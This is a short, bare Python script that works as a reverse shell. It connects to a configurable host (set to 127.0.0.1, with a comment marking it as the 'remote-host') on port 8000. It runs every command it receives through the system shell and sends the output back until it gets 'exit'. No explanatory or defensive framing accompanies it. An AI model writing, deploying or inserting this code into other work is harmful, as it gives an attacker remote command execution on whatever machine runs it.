import socket
import subprocess

IP = "127.0.0.1"  # "remote-host"
PORT = 8000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

while True:
    command = s.recv(1024).decode()
    if command == "exit":
        break
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    s.send(output.stdout)
    s.send(output.stderr)

s.close()
